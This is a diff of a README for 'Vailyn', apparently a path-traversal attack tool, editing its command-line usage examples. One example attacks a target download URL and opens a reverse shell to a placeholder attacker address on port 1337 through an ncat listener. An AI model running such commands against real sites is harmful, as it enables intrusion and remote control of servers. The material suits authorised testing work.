@@ -189,7 +189,7 @@ will infect DATA2 with the payload
 `$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -c cookie.txt`
 
 * Attack, but I want a reverse shell on port 1337:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -j MY.IP.IS.XX 1337`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -j MY.IP.IS.XX 1337  # a high Phase 2 Depth would be beneficial`
 (will start a ncat listener for you if on Unix)
 
 * Full automation in crawler mode:
